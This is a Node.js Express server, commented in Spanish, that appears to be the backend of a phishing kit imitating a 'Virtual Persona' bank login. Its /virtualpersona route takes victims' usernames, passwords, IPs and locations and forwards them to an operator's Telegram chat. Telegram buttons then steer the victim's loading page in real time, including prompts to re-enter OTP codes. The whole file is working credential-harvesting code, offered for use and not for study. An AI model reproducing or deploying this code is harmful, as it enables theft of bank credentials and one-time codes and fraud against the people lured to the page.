// 📦 server.js totalmente funcional para Virtual-Persona + Loading.html

const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const { v4: uuidv4 } = require("uuid");
const TelegramBot = require("node-telegram-bot-api");
const cors = require("cors");
const geoip = require("geoip-lite");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

// 📌 Memoria temporal para guardar acciones por sessionId
const instrucciones = new Map();

// ✅ Bot en modo polling
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
bot.deleteWebhook();

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ✅ Ruta principal para enviar datos desde Virtual-Persona.html
app.post("/virtualpersona", async (req, res) => {
  try {
    const { user, pass, ip, location } = req.body;
    const sessionId = uuidv4();
    const [city, country] = location.split(",");

    const text = `🔒 NUEVO INGRESO VIRTUAL 🔒\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌎 IP: ${ip} (${city.trim()}, ${country.trim()})\n🧾 SessionID: ${sessionId}`;

    const buttons = {
      inline_keyboard: [
        [
          { text: "❌ Error Logo", callback_data: `error_logo|${sessionId}` },
          { text: "🔁 Intentar OTP", callback_data: `error_otp|${sessionId}` },
        ],
        [
          { text: "✅ Continuar", callback_data: `siguiente|${sessionId}` },
        ],
      ],
    };

    // Enviar mensaje a Telegram
    await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.CHAT_ID,
        text,
        reply_markup: buttons,
      }),
    });

    res.json({ success: true, sessionId });
  } catch (error) {
    console.error("❌ Error en /virtualpersona:", error);
    res.status(500).json({ error: "Error interno del servidor" });
  }
});

// ✅ Ruta para polling desde loading.html
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const instruccion = instrucciones.get(sessionId);

  if (instruccion) {
    instrucciones.delete(sessionId);
    res.json({ action: instruccion });
  } else {
    res.json({ action: null });
  }
});

// ✅ Recibir respuesta de botones en Telegram
bot.on("callback_query", async (query) => {
  const callbackData = query.data; // ej: "error_logo|1f2e3a..."
  const [accion, sessionId] = callbackData.split("|");

  if (!sessionId) return;
  instrucciones.set(sessionId, accion);

  await bot.answerCallbackQuery({
    callback_query_id: query.id,
    text: `✔ Acción recibida: ${accion}`,
    show_alert: true,
  });
});
app.get("/", (req, res) => {
  res.send("✅ Servidor activo");
});

app.listen(PORT, () => {
  console.log(`🚀 Servidor activo en puerto ${PORT}`);
});

